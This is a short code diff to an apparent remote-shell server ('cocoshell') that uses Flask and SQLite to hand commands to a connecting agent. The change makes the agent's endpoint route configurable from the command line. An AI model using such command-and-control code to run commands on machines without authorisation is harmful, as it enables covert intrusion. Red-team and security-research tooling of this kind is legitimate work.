@@ -1,14 +1,14 @@
-import random
-import string
-import logging
-import sqlite3
+import logging, sqlite3, argparse, sys
 from os.path import exists
 from multiprocessing import Process
 from flask import Flask, session, request
 from werkzeug.exceptions import BadRequest
 
-letters = string.ascii_lowercase
-#route = '/' + ''.join(random.choice(letters) for i in range(3))
+parser = argparse.ArgumentParser()
+parser.add_argument("-r", "--route", help="the api endpoint the agent will connect to")
+args, leftovers = parser.parse_known_args()
+
+route = args.route
 
 db_exists = exists("cocoshell.db")
 con = sqlite3.connect("cocoshell.db", check_same_thread=False)
@@ -41,8 +41,9 @@ def set_result(result):
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
 api = Flask(__name__)
+#print(route, file=sys.stderr)
 
-@api.route('/test', methods=['GET', 'POST'])
+@api.route('/' + route, methods=['GET', 'POST'])
 def command_handling():
     if request.method == 'GET':
         last = is_command_available()
